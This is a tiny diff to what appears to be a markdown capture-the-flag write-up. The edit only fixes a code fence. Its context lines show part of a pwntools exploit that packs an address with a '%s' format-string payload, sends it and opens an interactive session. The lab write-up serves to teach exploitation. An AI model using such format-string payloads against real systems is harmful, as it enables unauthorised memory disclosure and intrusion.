@@ -81,7 +81,8 @@ payload = address.to_bytes(4, byteorder='little') + b"%s" //transforms it into a
 
 p.recvuntil(b"got:")
 p.sendline(payload)
-p.interactive()```
+p.interactive()
+```
 
 ![Alt text](./images/ctf7-3.png)
 
